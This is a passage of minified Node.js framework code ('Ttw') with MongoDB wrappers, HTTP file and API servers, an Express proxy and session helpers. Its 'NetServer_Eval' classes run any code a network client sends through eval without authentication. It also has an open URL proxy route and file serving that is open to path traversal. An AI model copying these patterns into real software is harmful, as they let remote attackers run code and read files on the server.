"+t.err):STtwUtilHttpServer.evt_request__httpServer_200_String(req,res,e.toString())},this.evt_Complete_Distinct=function(t,e){t?STtwUtilHttpServer.evt_request__httpServer_422(req,res,t.name+" "+t.code+" : "+t.err):STtwUtilHttpServer.evt_request__httpServer_200_JSON(req,res,e)},this.evt_Complete_Drop=function(t,e){t?STtwUtilHttpServer.evt_request__httpServer_422(req,res,t.name+" "+t.ok+" : "+t.errmsg):STtwUtilHttpServer.evt_request__httpServer_200_Boolean(req,res,e)},this.evt_Complete_Find=function(t,e){if(t)throw t;var o=STtwUtilMongoDBCollection.cb_Evt_Complete_Find_ToArray;e.toArray(o)},this.evt_Complete_FindAndModify=function(t,e){if(t)throw t;t?STtwUtilHttpServer.evt_request__httpServer_422(req,res,t.name+" "+t.ok+" : "+t.errmsg):STtwUtilHttpServer.evt_request__httpServer_200_JSON(req,res,e)},this.evt_Complete_FindAndRemove=function(t,e){t?STtwUtilHttpServer.evt_request__httpServer_422(req,res,t.name+" "+t.ok+" : "+t.errmsg):STtwUtilHttpServer.evt_request__httpServer_200_True(req,res)},this.evt_Complete_Insert=function(t,e){},this.evt_Complete_Remove=function(t,e){if(t)throw t},this.evt_Complete_Rename=function(t,e){STtwUtilMongoDBCollection.consoleLog__Status(e),t?STtwUtilHttpServer.evt_request__httpServer_422(req,res,t.name+" "+t.code+" : "+t.err):STtwUtilHttpServer.evt_request__httpServer_200_True(req,res)},this.evt_Complete_Save=function(t,e){t?STtwUtilHttpServer.evt_request__httpServer_422(req,res,t.name+" "+t.code+" : "+t.err):STtwUtilHttpServer.evt_request__httpServer_200_True(req,res)},this.evt_Complete_Update=function(t,e){t?STtwUtilHttpServer.evt_request__httpServer_422(req,res,t.name+" "+t.code+" : "+t.err):STtwUtilHttpServer.evt_request__httpServer_200_True(req,res)},this.cb_Evt_Complete_Find_ToArray=function(t,e){if(t)throw t;for(var o,n=0,i=e.length;i>n;++n)o=e[n]},this.consoleLog__Status=function(t){var e=console.log;e("t.collectionName : "+t.collectionName),e("t.initializeOrderedBulkOp : "+t.initializeOrderedBulkOp()),e("t.initializeUnorderedBulkOp : "+t.initializeUnorderedBulkOp()),e("t.listIndexes : "+t.listIndexes()),e("t.pkFactory : "+t.pkFactory()),e("t.raw : "+t.raw),e("t.serializeFunctions : "+t.serializeFunctions),e("t.serverCapabilities : "+t.serverCapabilities),e("t.slaveOk : "+t.slaveOk)},this.count=function(t,e){var o=e.cbFunction;t.count(e.query,e.options,o)},this.distinct=function(t,e){STtwUtilMongoDBCollection.consoleLog__Status(t);var o=STtwUtilMongoDBCollection.evt_Complete_Distinct;t.distinct(e.key,JSON.parse(e.query),e.options,o)},this.drop=function(t,e){STtwUtilMongoDBCollection.consoleLog__Status(t);var o=STtwUtilMongoDBCollection.evt_Complete_Drop;t.drop(o)},this.find=function(t,e,o){var n=o||STtwUtilMongoDBCollection.evt_Complete_Find;e?t.find(e.query,e.options,n):t.find(null,{},n)},this.findAndModify=function(t,e){STtwUtilMongoDBCollection.consoleLog__Status(t);var o=STtwUtilMongoDBCollection.evt_Complete_FindAndModify;t.findAndModify(JSON.parse(e.query),JSON.parse(e.sort),JSON.parse(e.doc),JSON.parse(e.options),o)},this.findAndRemove=function(t,e){STtwUtilMongoDBCollection.consoleLog__Status(t);var o=STtwUtilMongoDBCollection.evt_Complete_FindAndRemove;o.req=req,o.res=res;var n=JSON.parse(e.query),i=JSON.parse(e.sort),r=JSON.parse(e.options);t.findAndRemove(n,i,r,o)},this.findLast=function(t,e){var o=function(o,n){t.find({},{skip:n-1},e)};t.count(null,null,o)},this.insert=function(t,e,o){var n=o||STtwUtilMongoDBCollection.evt_Complete_Insert;t.insert(JSON.parse(e.docs),JSON.parse(e.options),n)},this.remove=function(t,e,o){STtwUtilMongoDBCollection.consoleLog__Status(t);var n=o||STtwUtilMongoDBCollection.evt_Complete_Remove;e?t.remove(JSON.parse(e.selector),e.options,n):t.remove(null,null,n)},this.rename=function(t,e){var o=STtwUtilMongoDBCollection.evt_Complete_Rename;t.rename(e.newName,JSON.parse(e.options),o)},this.save=function(t,e){var o=STtwUtilMongoDBCollection.evt_Complete_Save;t.save(JSON.parse(e.doc),JSON.parse(e.options),o)},void(this.update=function(t,e){var o=STtwUtilMongoDBCollection.evt_Complete_Update;t.update(JSON.parse(e.selector),JSON.parse(e.document),{upsert:!0,w:1},o)}))},e.CLASS.FN.MongoDBDB=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnMongoDBDB";var o=e.singleton(t.instanceKey,null);return o?o:(this["package"]="global.Lib.Ttw.fnMongoDBDB",this.evt_Complete_AddUser=function(t,e){},this.evt_Complete_Authenticate=function(t,e){},this.evt_Complete_Close=function(t,e){arguments.callee.data},this.evt_Complete_Collection=function(t,e){},this.evt_Complete_Command=function(t,e){},this.addUser=function(t,e){var o=STtwUtilMongoDBDB.evt_Complete_AddUser;e.options?t.addUser(e.username,e.password,e.options,o):t.addUser(e.username,e.password,o)},this.authenticate=function(t,e,o){var n=o||STtwUtilMongoDBDB.evt_Complete_Authenticate;e.options?t.authenticate(e.id,e.pw,e.options,n):t.authenticate(e.id,e.pw,n)},this.close=function(t,e){var o=STtwUtilMongoDBDB.evt_Complete_Close;o.data=e,t.close(o)},this.collection=function(t,e){STtwUtilMongoDBDB.consoleLog__Status(t);var o=STtwUtilMongoDBDB.evt_Complete_Collection;return e.options?t.collection(e.colNm,JSON.parse(e.options),o):t.collection(e.colNm,o)},this.command=function(t,e){STtwUtilMongoDBDB.consoleLog__Status(t);var o=STtwUtilMongoDBDB.evt_Complete_Command;return e.options?t.command(e.selector,JSON.parse(e.options),o):t.command(e.selector,o)},void(this.consoleLog__Status=function(t){var e=console.log;e("t._applicationClosed : "+t._applicationClosed),e("t._maxListeners : "+t._maxListeners),e("t._state : "+t._state),e("t.admin : "+t.admin()),e("t.bufferMaxEntries : "+t.bufferMaxEntries),e("t.databaseName : "+t.databaseName),e("t.emit : "+t.emit()),e("t.executeDbCommand : "+t.executeDbCommand()),e("t.forceServerObjectId : "+t.forceServerObjectId),e("t.isInitializing : "+t.isInitializing),e("t.listCollections : "+t.listCollections()),e("t.listeners : "+t.listeners()),e("t.native_parser : "+t.native_parser),e("t.numberOfRetries : "+t.numberOfRetries),e("t.openCalled : "+t.openCalled),e("t.pkFactory : "+t.pkFactory()),e("t.raw : "+t.raw),e("t.readPreference : "+t.readPreference),e("t.recordQueryStats : "+t.recordQueryStats),e("t.retryMiliSeconds : "+t.retryMiliSeconds),e("t.safe : "+t.safe),e("t.serializeFunctions : "+t.serializeFunctions),e("t.slaveOk : "+t.slaveOk),e("t.state : "+t.state),e("t.tag : "+t.tag)}))},e.CLASS.FN.MongoDBMongoClient=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnMongoDBMongoClient";var o=e.singleton(t.instanceKey,null);if(o)return o;this["package"]="global.Lib.Ttw.fnMongoDBMongoClient";var n=this;n.mongodb={},this.evt_Complete_Open=function(t,e){var o=arguments.callee.data;return t?void(o.cbFunctions&&o.cbFunctions.error(t)):(global._$TATIC_VALUE_DATABSE_MONGODB_MONGOCLIENT[o.kMongoClient]=o.mongoClient=e,void(o.cbFunctions&&o.cbFunctions.complete(o)))},this.consoleLog__Status=function(t){var e=console.log;e("t.super_ : "+t.super_())},this.create_With_Server=function(t){try{var e=n.mongodb;STtwUtilMongoDB.consoleLog__Status(e),STtwUtilMongoDBMongoClient.consoleLog__Status(e.MongoClient);var o=t.kMongoClient,i=t.serverConfig,r=t.options,l=new e.MongoClient(new e.Server(i.host,i.port),r);return global._$TATIC_VALUE_DATABSE_MONGODB_MONGOCLIENT[o]=l,l}catch(s){return s}},this.db=function(t,e){var o=global._$TATIC_VALUE_DATABSE_MONGODB_DB[e.kDb]=t.db(e.dbNm);return STtwUtilMongoDBDB.consoleLog__Status(o),o},this.open=function(t,e){global._$TATIC_VALUE_DATABSE_MONGODB_DB!=e.target&&(e.target=global._$TATIC_VALUE_DATABSE_MONGODB_DB);var o=STtwUtilMongoDBMongoClient.evt_Complete_Open;o.data=e,t.open(o)}}}();
global.TtwPackageNodeJS__NetServer_Eval=function(){var t=global,e=t.Lib.Ttw;e.CLASS.Net.Server.Eval=function(t){this.instanceKey=t.instanceKey||"global.Instance.netServer_Eval",this["package"]="global.Lib.Ttw.CLASS.Net.Server.Eval",this.evt_close=function(t){},this.evt_connection=function(t){var e=arguments.callee.owner,r="";t.on("data",function(e){if("$q\x00"===e)return t.write("$q"),t.end();try{var n=e.toString(),o=global.eval(n);t.write(o.toString())}catch(i){global.TtwLog.error("evt_data Error : "+i),r+=n;try{var o=STtwUtilR.rTtwBaJS(r);t.write(o.toString())}catch(a){global.TtwLog.error("evt_data Error 2 : "+a)}}}),t.on("end",e.evt_end),t.on("error",e.evt_error)},this.evt_end=function(t){},this.evt_error=function(t){try{}catch(e){}},this.evt_listening=function(t){},this.createServer=function(t){t.cbFunctions={listening:this.evt_listening,connection:this.evt_connection,close:this.evt_close,error:this.evt_error};var e=STtwUtilNetServer.createServer(t);return e},this.evt_connection.owner=this}}();
global.TtwPackageNodeJS__NetServer_Eval_Base64=function(){var t=global,e=t.Lib.Ttw;e.CLASS.Net.Server.Eval_Base64=function(t){this.instanceKey=t.instanceKey||"global.Instance.NetServer_Eval_Base64",this["package"]="global.Lib.Ttw.CLASS.Net.Server.Eval_Base64",this.evt_close=function(t){},this.evt_connection=function(t){var e=arguments.callee.owner,r="";t.on("data",function(e){if("$q\x00"===e)return t.write("$q"),t.end();try{var n=e.toString(),i=STtwUtilR.rBaJS(n);t.write(i.toString())}catch(o){global.TtwLog.error("evt_data Error : "+o),r+=n;try{var i=STtwUtilR.rTtwBaJS(r);t.write(i.toString())}catch(a){global.TtwLog.error("evt_data Error 2 : "+a)}}}),t.on("end",e.evt_end),t.on("error",e.evt_error)},this.evt_end=function(t){},this.evt_error=function(t){try{}catch(e){}},this.evt_listening=function(t){},this.createServer=function(t){t.cbFunctions={listening:this.evt_listening,connection:this.evt_connection,close:this.evt_close,error:this.evt_error};var e=STtwUtilNetServer.createServer(t);return e},this.evt_connection.owner=this}}();
global.TtwPackageNodeJS__NetServer_Eval_TtwBase64=function(){var t=global,e=t.Lib.Ttw;e.CLASS.Net.Server.Eval_TtwBase64=function(t){this.instanceKey=t.instanceKey||"global.Instance.NetServer_Eval_TtwBase64",this["package"]="global.Lib.Ttw.CLASS.Net.Server.Eval_TtwBase64",this.evt_close=function(t){},this.evt_connection=function(t){var e=arguments.callee.owner,r="";t.on("data",function(e){if("$q\x00"===e)return t.write("$q"),t.end();try{var n=e.toString(),i=STtwUtilR.rTtwBaJS(n);t.write(i.toString())}catch(o){global.TtwLog.error("evt_data Error : "+o),r+=n;try{var i=STtwUtilR.rTtwBaJS(r);t.write(i.toString())}catch(a){global.TtwLog.error("evt_data Error 2 : "+a)}}}),t.on("end",e.evt_end),t.on("error",e.evt_error)},this.evt_end=function(t){},this.evt_error=function(t){try{}catch(e){}},this.evt_listening=function(t){},this.createServer=function(t){t.cbFunctions={listening:this.evt_listening,connection:this.evt_connection,close:this.evt_close,error:this.evt_error};var e=STtwUtilNetServer.createServer(t);return e},this.evt_connection.owner=this}}();
global.TtwPackageNodeJS__Web_Express=function(){var e=global,t=e.Lib.Ttw;t.CLASS.FN.Web_Express=function(e){function r(e){}function s(e){global.TtwLog.error("evt_error__net_Server Error : "+e),"EADDRINUSE"===e.code||"EACCES"===e.code,process.exit(1)}function n(e,t){var r={};return Object.keys(t).forEach(function(e){n._regExp_dontProxyHeader.test(e)||(r[e]=t[e])}),global._$TATIC_CONST_DEBUG,r}function o(e){var t=e.params[0];return t&&(/^https?:\/\//.test(t)||(t="http://"+t),t=STtwUtilWeb_Express.url.parse(t),t.search=STtwUtilWeb_Express.url.parse(e.url).search),t}this.instanceKey=e.instanceKey||"global.Lib.Ttw.fnWeb_Express";var i=t.singleton(e.instanceKey,null);if(i)return i;this["package"]="global.Lib.Ttw.Web_Express";try{this.express=require("express")}catch(c){}try{this.compression=require("compression")}catch(c){}try{this.request=require("request")}catch(c){}this.url=require("url"),this.create_Get__Proxy=function(e,t){return t=t?t:"/ttwP/*",e.get(t,arguments.callee._proxy),e},this.create_Get__Proxy._proxy=function(e,t,r){var s=o(e);return s||(s=Object.keys(e.query)[0],s&&(s=STtwUtilWeb_Express.url.parse(s))),s?(s.protocol||(s.protocol="http:"),void STtwUtilWeb_Express.request.get({url:STtwUtilWeb_Express.url.format(s),headers:n(e,e.headers),encoding:null,timeout:2e3},function(r,s,o){var i=500;s&&(i=s.statusCode,t.header(n(e,s.headers))),t.status(i).send(o)})):t.send(400,"No url specified.")},this.create_Post__Proxy=function(e,t){},this.createServer=function(e,t){var n=e.listen(t.port,t.hostName?t.hostName:null,function(){if(t.cbFunctions)try{t.cbFunctions.complete?t.cbFunctions.complete():null}catch(e){global.TtwLog.error("Error : "+e)}});return t.cbFunctions&&(n.on("close",t.cbFunctions.close?t.cbFunctions.close:r),n.on("error",t.cbFunctions.error?t.cbFunctions.error:s)),n},this.createServerApplication=function(e){var t=STtwUtilWeb_Express.express();return t.use(STtwUtilWeb_Express.compression()),t.use(STtwUtilWeb_Express.express["static"](e.rootPath)),t},n._regExp_dontProxyHeader=/^(?:Host|Proxy-Connection|Connection|Keep-Alive|Transfer-Encoding|TE|Trailer|Proxy-Authorization|Proxy-Authenticate|Upgrade)$/i},t.CLASS.Web.Express.WebExpressHTTPServer=function(e){var t,r=(this.instanceKey=e.instanceKey||"global.Instance.webExpressHTTPServer ",this["package"]="global.Lib.Ttw.CLASS.Web.Express.WebExpressHTTPServer",STtwUtilWeb_Express.createServerApplication(e));return this.server,this.add_Get=function(e,t){r.get(e,t)},this.initialize=function(){STtwUtilWeb_Express.create_Get__Proxy(r,"/ttwP/*"),this.server=STtwUtilWeb_Express.createServer(r,e),process.on("SIGINT",function(){t.close(function(){process.exit(0)})})},this.initialize(),this}}();
global.TtwPackageNodeJS__WebService=function(){var e=global,t=e.Lib.Ttw;t.CLASS.FN.HttpClientResponse=function(e){this.instanceKey=e.instanceKey||"global.Lib.Ttw.fnHttpClientResponse";var r=t.singleton(e.instanceKey,null);if(r)return r;this["package"]="global.Lib.Ttw.CLASS.FN.HttpClientResponse";this.consoleLog__Status=function(e){var t=global.TtwLog.timeStamp;t("t._consuming : "+e._consuming),t("t._dumped : "+e._dumped),t("t._maxListeners : "+e._maxListeners),t("t._pendingIndex : "+e._pendingIndex),t("t.domain : "+e.domain),t("t.httpVersion : "+e.httpVersion),t("t.httpVersionMajor : "+e.httpVersionMajor),t("t.httpVersionMinor : "+e.httpVersionMinor),t("t.method : "+e.method),t("t.readable : "+e.readable),t("t.statusCode : "+e.statusCode),t("t.url : "+e.url);var r=e.client,t=global.TtwLog.timeStamp;t("t.client Detail----------"),t("o._bytesDispatched : "+r._bytesDispatched),t("o._idleStart : "+r._idleStart),t("o._idleTimeout : "+r._idleTimeout),t("o._maxListeners : "+r._maxListeners),t("o._monotonicStartTime : "+r._monotonicStartTime),t("o._paused : "+r._paused),t("o.allowHalfOpen : "+r.allowHalfOpen),t("o.bytesWritten : "+r.bytesWritten),t("o.destroyed : "+r.destroyed),t("o.domain : "+r.domain),t("o.localAddress : "+r.localAddress),t("o.localPort : "+r.localPort),t("o.readable : "+r.readable),t("o.remoteAddress : "+r.remoteAddress),t("o.remotePort : "+r.remotePort),t("o.writable : "+r.writable)};var i=function(e){return{sid:STtwUtilHttpClientRequest.getHeader_Session(e),d_ex:n()}};this.create_Cookie=function(e){i(e)};var n=function(){n.pad;global._$TATIC_CONST_SESSION_TIME=global._$TATIC_CONST_SESSION_TIME?global._$TATIC_CONST_SESSION_TIME:2e6;var e=new Date(+new Date+global._$TATIC_CONST_SESSION_TIME);return e.toGMTString()};n.pad=function(e){return e>9?""+e:"0"+e},this.create_Date__Expired=function(){return n()};var _=function(e){var t=STtwUtilHttpServer.getQueryFromURL(e.url),r=STtwUtilCrypto.getRandomBytes_nBytes_FrontMergeDate(2);r=t.pid+"::"+r;var i=new Buffer(r,"utf8"),n=i.toString("base64"),_=new Buffer(n,"utf8"),s=_.toString("hex");return r=null,i=null,n=null,_=null,s};this.create_Session=function(e){return _(e)};var s=/;.*/gi,o=function(e){var t=e.getHeader("cookie"),r=e.getHeader("set-cookie");if(r=t?t:r){var i=r.split("connect.sid=");if(i[1])return i[1].replace(s,"");if(i=r.split("session_id="),i[1])return i[1].replace(s,"")}return null};this.getHeader_Session=function(e){return o(e)};var a=function(e,t){if(t.headers){var r=t.headers;r.cookie||r["set-cookie"]||t.setHeader("set-cookie","connect.sid="+STtwUtilHttpClientRequest.getHeader_Session(e)+"; Expires="+n()+"; HttpOnly")}else t.setHeader("set-cookie","connect.sid="+STtwUtilHttpClientRequest.getHeader_Session(e)+"; Expires="+n()+"; HttpOnly")};this.setHeader_Session=function(e,t){a(e,t)}},t.CLASS.FN.HttpClientRequest=function(e){this.instanceKey=e.instanceKey||"global.Lib.Ttw.fnHttpClientRequest";var r=t.singleton(e.instanceKey,null);if(r)return r;this["package"]="global.Lib.Ttw.CLASS.FN.HttpClientRequest",this.consoleLog__Status=function(e){var t=global.TtwLog.timeStamp;t("t._consuming : "+e._consuming),t("t._dumped : "+e._dumped),t("t._maxListeners : "+e._maxListeners),t("t._pendingIndex : "+e._pendingIndex),t("t.domain : "+e.domain),t("t.httpVersion : "+e.httpVersion),t("t.httpVersionMajor : "+e.httpVersionMajor),t("t.httpVersionMinor : "+e.httpVersionMinor),t("t.method : "+e.method),t("t.readable : "+e.readable),t("t.statusCode : "+e.statusCode),t("t.url : "+e.url);var r=e.client,t=global.TtwLog.timeStamp;t("t.client Detail----------"),t("o._bytesDispatched : "+r._bytesDispatched),t("o._idleStart : "+r._idleStart),t("o._idleTimeout : "+r._idleTimeout),t("o._maxListeners : "+r._maxListeners),t("o._monotonicStartTime : "+r._monotonicStartTime),t("o._paused : "+r._paused),t("o.allowHalfOpen : "+r.allowHalfOpen),t("o.bytesWritten : "+r.bytesWritten),t("o.destroyed : "+r.destroyed),t("o.domain : "+r.domain),t("o.localAddress : "+r.localAddress),t("o.localPort : "+r.localPort),t("o.readable : "+r.readable),t("o.remoteAddress : "+r.remoteAddress),t("o.remotePort : "+r.remotePort),t("o.writable : "+r.writable)};var i=function(e){if(e.headers){var t=e.headers;if(t.cookie){for(var r,i={},n=t.cookie.split("; "),_=0,s=n.length;s>_;++_)r=n[_].split("="),i[r[0]]=r[1];return i}return null}return null};this.getHeader_Cookie=function(e){return i(e)};var n=/;.*/gi,_=function(e){if(e.headers){var t=e.headers;if(t.cookie){var r=t.cookie.split("connect.sid=");if(r[1])return r[1].replace(n,"");if(r=t.cookie.split("session_id="),r[1])return r[1].replace(n,"")}return null}};this.getHeader_Session=function(e){return _(e)},this.getIP=function(e){var t=e.client.remoteAddress;return t.replace("::ffff:","")}},t.CLASS.FN.HttpServer=function(e){this.instanceKey=e.instanceKey||"global.Lib.Ttw.fnHttpServer";var r=t.singleton(e.instanceKey,null);if(r)return r;this["package"]="global.Lib.Ttw.fnHttpServer";var i=require("fs"),n=require("path"),_=require("url");this.evt_request__API_Only=function(e,t){var r=STtwUtilHttpServer.getURIFromURL(e.url);try{global._$TATIC_VALUE_SERVER_HTTP_EVTS_REQUEST[r](e,t)}catch(i){return void STtwUtilHttpServer.evt_request__httpServer_404(e,t)}},this.evt_request__APIAndFilePath=function(e,t){var r=STtwUtilHttpServer.getURIFromURL(e.url);try{global._$TATIC_VALUE_SERVER_HTTP_EVTS_REQUEST[r]?global._$TATIC_VALUE_SERVER_HTTP_EVTS_REQUEST[r](e,t):STtwUtilHttpServer.evt_request__Target_FilePath(e,t)}catch(i){return void STtwUtilHttpServer.evt_request__httpServer_404(e,t)}},this.evt_request__httpServer_200_Boolean=function(e,t,r){STtwUtilHttpServerResponse.responseWrite_200_Boolean(t,r)},this.evt_request__httpServer_200_False=function(e,t){STtwUtilHttpServerResponse.responseWrite_200_False(t)},this.evt_request__httpServer_200_JSON=function(e,t,r){STtwUtilHttpServerResponse.responseWrite_200_JSON(t,r)},this.evt_request__httpServer_200_Int=function(e,t,r){STtwUtilHttpServerResponse.responseWrite_200_Int(t,r)},this.evt_request__httpServer_200_String=function(e,t,r){STtwUtilHttpServerResponse.responseWrite_200_String(t,r),gc(!0)},this.evt_request__httpServer_200_True=function(e,t){STtwUtilHttpServerResponse.responseWrite_200_True(t)},this.evt_request__httpServer_404=function(e,t){STtwUtilHttpServerResponse.responseWrite_404(t)},this.evt_request__httpServer_422=function(e,t,r){STtwUtilHttpServerResponse.responseWrite_422(t,r)},this.evt_request__Root_FilePath=function(e,t){STtwUtilHttpClientRequest.consoleLog__Status(e);var r,_=STtwUtilHttpServer.getURIFromURL(e.url),s=n.join(process.cwd(),unescape(_));try{r=i.lstatSync(s)}catch(o){return void STtwUtilHttpServerResponse.responseWrite_404(t)}if(r.isFile()){t.writeHead(200,{"Content-Type":global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES[n.extname(s).split(".").reverse()[0]]});var a=i.createReadStream(s);STtwUtilFsReadStream.consoleLog__Status(a),a.pipe(t)}else r.isDirectory()?(t.writeHead(200,{"Content-Type":global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES.txt}),t.write("Index of "+_+"\n"),t.write("TODO, show index?\n"),t.end()):STtwUtilHttpServerResponse.responseWrite_500(t);STtwUtilHttpServerResponse.consoleLog__Status(t)},this.evt_request__Target_FilePath=function(e,t){global._$TATIC_CONST_SERVER_HTTP_TARGET_PATH=global._$TATIC_CONST_SERVER_HTTP_TARGET_PATH||process.cwd();var r,_=STtwUtilHttpServer.getURIFromURL(e.url),s=n.join(global._$TATIC_CONST_SERVER_HTTP_TARGET_PATH,unescape(_));try{r=i.lstatSync(s)}catch(o){return void STtwUtilHttpServerResponse.responseWrite_404(t)}if(r.isFile()){t.writeHead(200,{"Content-Type":global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES[n.extname(s).split(".").reverse()[0]]});var a=i.createReadStream(s);a.pipe(t)}else r.isDirectory()?(t.writeHead(200,{"Content-Type":global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES.txt}),t.write("Index of "+_+"\n"),t.write("TODO, show index?\n"),t.end()):STtwUtilHttpServerResponse.responseWrite_500(t)},this.consoleLog__Status=function(e){var t=console.log,r=global.TtwLog.logObjectInformation;r(e._events,"t._events : "),t("t._maxListeners : "+e._maxListeners),t("t._usingSlaves : "+e._usingSlaves),t("t.allowHalfOpen : "+e.allowHalfOpen),t("t.domain : "+e.domain),t("t.httpAllowHalfOpen : "+e.httpAllowHalfOpen),t("t.timeout : "+e.timeout)},this.destroy=function(){this.server.removeAllListeners()},this.listen=function(e,t,r){global.TtwLog.timeStamp(t+":"+r),e.server.listen(t,r),STtwUtilHttpServer.consoleLog__Status(e.server)},this.getQueryFromURL=function(e){var t=arguments.callee.url.parse(e,!0).query;return t},this.getURIFromURL=function(e){var t=_.parse(e).pathname;return t},this.getQueryFromURL.url=_},t.CLASS.FN.HttpServerResponse=function(e){this.instanceKey=e.instanceKey||"global.Lib.Ttw.fnHttpServerResponse";var r=t.singleton(e.instanceKey,null);return r?r:(this["package"]="global.Lib.Ttw.fnHttpServerResponse",this.consoleLog__Status=function(e){var t=console.log;t("t._hangupClose : "+e._hangupClose),t("t._hasBody : "+e._hasBody),t("t._header : "+e._header),t("t._headerSent : "+e._headerSent),t("t._maxListeners : "+e._maxListeners),t("t._trailer : "+e._trailer),t("t.chunkedEncoding : "+e.chunkedEncoding),t("t.finished : "+e.finished),t("t.headersSent : "+e.headersSent),t("t.sendDate : "+e.sendDate),t("t.statusCode : "+e.statusCode),t("t.useChunkedEncodingByDefault : "+e.useChunkedEncodingByDefault),t("t.writable : "+e.writable)},this.responseWrite_200=function(e){},this.responseWrite_200_Boolean=function(e,t){e.writeHead(200,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES.txt),e.write(t.toString()),e.end()},this.responseWrite_200_False=function(e){e.writeHead(200,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES.txt),e.write("false"),e.end()},this.responseWrite_200_Int=function(e,t){e.writeHead(200,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES.txt),e.write(t),e.end()},this.responseWrite_200_JSON=function(e,t){e.writeHead(200,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES.txt),e.write(JSON.stringify(t)),e.end()},this.responseWrite_200_String=function(e,t){e.writeHead(200,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES.txt),e.write(t),e.end()},this.responseWrite_200_True=function(e){e.writeHead(200,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES.txt),e.write("true"),e.end()},this.responseWrite_404=function(e){e.writeHead(404,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES.txt),e.write("404 Not Found\n"),e.end()},this.responseWrite_422=function(e,t){e.writeHead(422,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES.txt),e.write(t+"\n"),e.end()},void(this.responseWrite_500=function(e){e.writeHead(500,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES.txt),e.write("500 Internal server error\n"),e.end()}))},t.CLASS.Http.Server.HttpServerAbstract=function(){return this.instanceKey,this["package"],global._$TATIC_CONST_SERVER_HTTP_HOST,global._$TATIC_CONST_SERVER_HTTP_PORT,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES,this.http,this.server,this.evt_request,this.listen,this},t.CLASS.Http.Server.HttpServer=function(e){this.instanceKey=e.instanceKey||"global.Instance.httpServer",this["package"]="global.Lib.Ttw.CLASS.Http.Server.HttpServer",global._$TATIC_CONST_SERVER_HTTP_HOST=global._$TATIC_CONST_SERVER_HTTP_HOST||"127.0.0.1",global._$TATIC_CONST_SERVER_HTTP_PORT=global._$TATIC_CONST_SERVER_HTTP_PORT||80,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES=global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES||{bmp:"image/bmp",jpeg:"image/jpeg",jpg:"image/jpeg",json:"text/json",png:"image/png",xml:"text/xml"};require("fs"),require("path"),require("url"),global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES;return this.http=require("http"),this.server,this.evt_request=STtwUtilHttpServer.evt_request__Root_FilePath,this.listen=function(e,t){STtwUtilHttpServer.listen(this,e,t)},this.evt_request.owner=this,this.server=this.http.createServer(this.evt_request),this},t.CLASS.Http.Server.HttpServer__TargetPath=function(e){this.instanceKey=e.instanceKey||"global.Instance.httpServer__TargetPath",this["package"]="global.Lib.Ttw.CLASS.Http.Server.HttpServer__TargetPath",global._$TATIC_CONST_SERVER_HTTP_HOST=global._$TATIC_CONST_SERVER_HTTP_HOST||"127.0.0.1",global._$TATIC_CONST_SERVER_HTTP_PORT=global._$TATIC_CONST_SERVER_HTTP_PORT||80,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES=global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES||{bmp:"image/bmp",jpeg:"image/jpeg",jpg:"image/jpeg",json:"text/json",png:"image/png",xml:"text/xml"};require("fs"),require("path"),require("url"),global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES;return this.http=require("http"),this.server,this.evt_request=STtwUtilHttpServer.evt_request__Target_FilePath,this.listen=function(e,t){STtwUtilHttpServer.listen(this,e,t)},this.evt_request.owner=this,this.server=this.http.createServer(this.evt_request),this},t.CLASS.Http.Server.HttpServer_API=function(e){this.instanceKey=e.instanceKey||"global.Instance.httpServer_API",this["package"]="global.Lib.Ttw.CLASS.Http.Server.HttpServer_API",global._$TATIC_VALUE_SERVER_HTTP_EVTS_REQUEST=global._$TATIC_VALUE_SERVER_HTTP_EVTS_REQUEST||{},global._$TATIC_CONST_SERVER_HTTP_HOST=global._$TATIC_CONST_SERVER_HTTP_HOST||"127.0.0.1",global._$TATIC_CONST_SERVER_HTTP_PORT=global._$TATIC_CONST_SERVER_HTTP_PORT||80,global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES=global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES||{html:"text/html",js:"application/javascript",txt:"text/plain"};require("fs"),require("path"),require("url"),global._$TATIC_CONST_SERVER_HTTP_MIME_TYPES;return this.http=require("http"),this.server,this.nCount=0,"api"==e.requestMode?this.evt_request=STtwUtilHttpServer.evt_request__API_Only:this.evt_request=STtwUtilHttpServer.evt_request__APIAndFilePath,this.listen=function(e,t){STtwUtilHttpServer.listen(this,e,t)},this.server=this.http.createServer(this.evt_request),this}}();
global.TtwPackageNodeJS__CLASS__WebSocket=function(){"use strict";global.Lib=global.Lib||{};global.Lib.Ttw=global.Lib.Ttw||{};global.Lib.Ttw.CLASS=global.Lib.Ttw.CLASS||{};global.Lib.Ttw.CLASS.TtwWebSocket=global.Lib.Ttw.CLASS.TtwWebSocket||{};global.Lib.Ttw.CLASS.TtwWebSocket.__initialize=function(){(function(){var buffer=require("buffer");global.Lib.Ttw.CLASS.TtwWebSocket.SafeBuffer=function( arg, encodingOrOffset, length ){return global.Buffer.from( arg, encodingOrOffset, length );};Object.keys( global.Buffer ).forEach( function( prop ){ global.Lib.Ttw.CLASS.TtwWebSocket.SafeBuffer[prop]=global.Buffer[prop];});global.Lib.Ttw.CLASS.TtwWebSocket.SafeBuffer.from=function( arg, encodingOrOffset, length ){ if(typeof arg==="number") throw new TypeError("Argument must not be a number"); return global.Buffer.from( arg, encodingOrOffset, length );};global.Lib.Ttw.CLASS.TtwWebSocket.SafeBuffer.alloc=function( size, fill, encoding ){if(typeof size !=="number") throw new TypeError("Argument must be a number");var buf=Buffer.from(size);if(fill !== undefined ){if(typeof encoding==="string") buf.fill( fill, encoding );else 